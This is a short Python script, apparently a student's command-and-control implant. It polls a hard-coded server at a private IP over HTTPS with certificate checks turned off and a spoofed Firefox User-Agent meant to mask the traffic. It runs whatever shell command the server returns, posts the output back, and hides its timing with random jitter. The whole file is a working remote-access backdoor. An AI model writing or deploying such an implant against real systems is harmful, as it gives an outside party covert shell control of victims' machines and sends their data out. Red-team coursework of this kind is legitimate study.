#!/usr/bin/env python3

# Name: Shane Russell
# Email: smr7408@rit.edu

import requests, subprocess, time, random, os, urllib3

# Disable self-signed cert warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configs (can be later edited) - change URL to your server IP or domain
URL = "https://100.65.8.24:443"
ID = os.uname().nodename
# headers to mask traffic (can be later edited) - specific to target environment
HEADERS = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0"}

def main():
    # Command processing
    while True:
        try:
            reqs = requests.post(f"{URL}/b", json={"id": ID}, headers=HEADERS, verify=False, timeout=10)
            
            task = reqs.json().get("task")
            
            if task:
                res = subprocess.run(task, capture_output=True, text=True, shell=True)
                requests.post(f"{URL}/r", json={"id": ID, "output": res.stdout + res.stderr}, headers=HEADERS, verify=False)
        except:
            pass
        
        # Jitter for stealth - random sleep between 15-25 seconds
        time.sleep(20 + random.uniform(-5, 5))

if __name__ == "__main__":
    main()